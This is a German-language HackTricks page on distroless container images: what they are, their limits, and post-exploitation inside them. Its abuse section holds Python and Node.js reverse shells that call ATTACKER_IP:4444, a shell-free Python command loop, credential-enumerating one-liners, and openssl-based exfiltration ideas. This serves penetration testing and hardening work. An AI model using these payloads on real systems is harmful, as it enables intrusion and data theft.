# Distroless Container

{{#include ../../../banners/hacktricks-training.md}}

## Übersicht

Ein **distroless** Container-Image ist ein Image, das die **minimalen Laufzeitkomponenten enthält, die erforderlich sind, um eine spezifische Anwendung auszuführen**, wobei bewusst die üblichen Distributionstools wie Paketmanager, Shells und große Mengen generischer Userland-Utilities entfernt werden. In der Praxis enthalten distroless-Images oft nur das Anwendungs-Binary oder die Runtime, dessen shared libraries, Zertifikat-Bundles und ein sehr kleines Dateisystem-Layout.

Worum es nicht geht, ist, dass distroless eine neue Kernel-Isolationsprimitive wäre. Distroless ist eine **Image-Design-Strategie**. Es ändert, was im Container-Dateisystem **verfügbar** ist, nicht wie der Kernel den Container isoliert. Diese Unterscheidung ist wichtig, weil distroless die Umgebung hauptsächlich dadurch härtert, dass es reduziert, was ein Angreifer nach Erlangen von Codeausführung verwenden kann. Es ersetzt nicht Namespaces, seccomp, Capabilities, AppArmor, SELinux oder andere Runtime-Isolationsmechanismen.

## Warum Distroless existiert

Distroless-Images werden hauptsächlich verwendet, um zu reduzieren:

- die Image-Größe
- die operative Komplexität des Images
- die Anzahl von Paketen und Binaries, die Schwachstellen enthalten könnten
- die Anzahl an Post-Exploitation-Tools, die einem Angreifer standardmäßig zur Verfügung stehen

Deshalb sind distroless-Images in Produktionsanwendungs-Deployments beliebt. Ein Container, der keine Shell, keinen Paketmanager und fast kein generisches Tooling enthält, ist in der Regel operativ leichter zu überblicken und nach einer Kompromittierung interaktiv schwerer auszunutzen.

Beispiele für bekannte distroless-ähnliche Image-Familien sind:

- Google's distroless images
- Chainguard hardened/minimal images

## Was Distroless nicht bedeutet

Ein distroless-Container ist **nicht**:

- automatisch rootless
- automatisch non-privileged
- automatisch read-only
- automatisch durch seccomp, AppArmor oder SELinux geschützt
- automatisch sicher vor container escape

Es ist weiterhin möglich, ein distroless-Image mit `--privileged`, Host-Namespace-Sharing, gefährlichen Bind-Mounts oder einem gemounteten Runtime-Socket zu betreiben. In diesem Szenario mag das Image minimal sein, aber der Container kann trotzdem katastrophal unsicher sein. Distroless ändert die **Userland-Angriffsfläche**, nicht die **Kernel-Trust-Boundary**.

## Typische betriebliche Eigenschaften

Wenn du einen distroless-Container kompromittierst, ist das Erste, was du normalerweise feststellst, dass gängige Annahmen nicht mehr zutreffen. Es gibt möglicherweise kein `sh`, kein `bash`, kein `ls`, kein `id`, kein `cat` und manchmal nicht einmal eine libc-basierte Umgebung, die sich so verhält, wie dein übliches Tradecraft es erwartet. Das betrifft sowohl Offensive als auch Defensive, da das fehlende Tooling Debugging, Incident Response und Post-Exploitation verändert.

Die häufigsten Muster sind:

- die Anwendungs-Runtime ist vorhanden, aber sonst kaum etwas
- shell-basierte Payloads schlagen fehl, weil keine Shell vorhanden ist
- gängige One-Liner zur Enumeration schlagen fehl, weil die Hilfs-Binaries fehlen
- Dateisystem-Schutzmaßnahmen wie read-only rootfs oder `noexec` auf beschreibbaren tmpfs-Standorten sind oft ebenfalls vorhanden

Diese Kombination ist meist der Grund dafür, dass Leute von „weaponizing distroless“ sprechen.

## Distroless und Post-Exploitation

Die hauptsächliche offensive Herausforderung in einer distroless-Umgebung ist nicht immer das initiale RCE. Häufig ist es das, was danach kommt. Wenn die ausgebeutete Workload Codeausführung in einer Language-Runtime wie Python, Node.js, Java oder Go bietet, kannst du möglicherweise beliebige Logik ausführen, aber nicht über die üblichen shell-zentrierten Workflows, die bei anderen Linux-Zielen üblich sind.

Das bedeutet, dass sich Post-Exploitation oft in eine von drei Richtungen verschiebt:

1. **Die vorhandene Language-Runtime direkt nutzen**, um die Umgebung zu enumerieren, Sockets zu öffnen, Dateien zu lesen oder zusätzliche Payloads zu stagen.
2. **Eigenes Tooling in den Speicher bringen**, wenn das Dateisystem read-only ist oder beschreibbare Orte mit `noexec` gemountet sind.
3. **Vorhandene Binaries im Image missbrauchen**, falls die Anwendung oder ihre Abhängigkeiten etwas unerwartet Nützliches enthalten.

## Missbrauch

### Die vorhandene Runtime untersuchen

In vielen distroless-Containern gibt es keine Shell, aber es ist dennoch eine Anwendungs-Runtime vorhanden. Wenn das Ziel ein Python-Service ist, ist Python da. Wenn das Ziel Node.js ist, ist Node da. Das bietet oft ausreichend Funktionalität, um Dateien zu enumerieren, Umgebungsvariablen zu lesen, Reverse-Shells zu öffnen und In-Memory-Ausführung zu stagen, ohne jemals `/bin/sh` aufzurufen.

Ein einfaches Beispiel mit Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Ein einfaches Beispiel mit Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Auswirkungen:

- Wiederherstellung von Umgebungsvariablen, oft einschließlich credentials oder Service-Endpunkten
- Auflistung des Dateisystems ohne `/bin/ls`
- Identifizierung von beschreibbaren Pfaden und gemounteten secrets

### Reverse Shell ohne `/bin/sh`

Wenn das Image kein `sh` oder `bash` enthält, kann eine klassische shell-basierte reverse shell sofort fehlschlagen. Verwenden Sie in diesem Fall stattdessen die installierte Laufzeitumgebung.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Falls `/bin/sh` nicht existiert, ersetze die letzte Zeile durch direkte, von Python gesteuerte Befehlsausführung oder eine Python-REPL-Schleife.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Nochmals: Wenn /bin/sh fehlt, verwenden Sie stattdessen direkt Node's filesystem, process und networking APIs, anstatt eine Shell zu starten.

### Vollständiges Beispiel: No-Shell Python Command Loop

Wenn das Image Python hat, aber überhaupt keine Shell, reicht oft eine einfache interaktive Schleife aus, um die volle post-exploitation-Fähigkeit zu erhalten:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Das erfordert keine interaktive shell binary. Die Auswirkung ist aus Sicht des Angreifers effektiv dieselbe wie bei einer einfachen shell: command execution, enumeration und das Staging weiterer payloads über die vorhandene runtime.

### In-Memory Tool Execution

Distroless images werden häufig kombiniert mit:

- `readOnlyRootFilesystem: true`
- writable but `noexec` tmpfs such as `/dev/shm`
- a lack of package management tools

Diese Kombination macht klassische "download binary to disk and run it" Workflows unzuverlässig. In solchen Fällen werden Memory-Execution-Techniken zur Hauptlösung.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

The most relevant techniques there are:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Existing Binaries Already In The Image

Einige Distroless images enthalten dennoch betrieblich notwendige binaries, die nach einem Kompromiss nützlich werden. Ein wiederholt beobachtetes Beispiel ist `openssl`, weil Anwendungen es manchmal für crypto- oder TLS-bezogene Aufgaben benötigen.

A quick search pattern is:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Wenn `openssl` vorhanden ist, kann es verwendet werden für:

- ausgehende TLS-Verbindungen
- Datenexfiltration über einen erlaubten Ausgehkanal
- Staging von payload-Daten über kodierte/verschlüsselte Blobs

Der genaue Missbrauch hängt davon ab, was tatsächlich installiert ist, aber die Grundidee ist, dass distroless nicht "überhaupt keine Tools" bedeutet; es bedeutet "deutlich weniger Tools als ein normales Distribution-Image".

## Prüfungen

Ziel dieser Prüfungen ist festzustellen, ob das Image in der Praxis wirklich distroless ist und welche Laufzeit- oder Hilfs-Binaries noch für post-exploitation verfügbar sind.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Interessant ist hier:

- Wenn keine Shell vorhanden ist, aber eine Laufzeit wie Python oder Node vorhanden ist, sollte die post-exploitation auf laufzeitgesteuerte Ausführung pivotieren.
- Wenn das Root-Dateisystem schreibgeschützt ist und `/dev/shm` zwar beschreibbar, aber mit `noexec` versehen ist, werden memory execution techniques deutlich relevanter.
- Wenn Hilfs-Binaries wie `openssl`, `busybox` oder `java` existieren, können sie genug Funktionalität bieten, um weiteren Zugriff zu ermöglichen.

## Laufzeit-Defaults

| Image / platform style | Standardeinstellung | Typisches Verhalten | Typische manuelle Abschwächungen |
| --- | --- | --- | --- |
| Google distroless style images | Vom Design her minimales Userland | Keine Shell, kein Paketmanager, nur Anwendungs-/Runtime-Abhängigkeiten | Hinzufügen von Debug-Layern, Sidecar-Shells, Kopieren von busybox oder Tools |
| Chainguard minimal images | Vom Design her minimales Userland | Reduzierte Paketoberfläche, oft auf eine Laufzeit oder einen Service fokussiert | Verwendung von `:latest-dev` oder Debug-Varianten, Kopieren von Tools während des Builds |
| Kubernetes workloads using distroless images | Hängt von der Pod-Konfiguration ab | Distroless betrifft nur das Userland; die Sicherheitslage des Pods hängt weiterhin von der Pod-Spezifikation und den Laufzeit-Defaults ab | Hinzufügen ephemerer Debug-Container, Host-Mounts, privilegierte Pod-Einstellungen |
| Docker / Podman running distroless images | Hängt von Run-Flags ab | Minimales Dateisystem, aber Laufzeitsicherheit hängt weiterhin von Flags und Daemon-Konfiguration ab | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

Der entscheidende Punkt ist, dass distroless eine **Eigenschaft des Images** ist, kein Laufzeitschutz. Sein Wert besteht darin, zu reduzieren, was nach einer Kompromittierung innerhalb des Dateisystems verfügbar ist.

## Verwandte Seiten

Für filesystem- und memory-execution-Bypässe, die in distroless-Umgebungen häufig benötigt werden:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Für Missbrauch der Container-Runtime, Sockets und Mounts, der weiterhin auf distroless-Workloads zutrifft:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
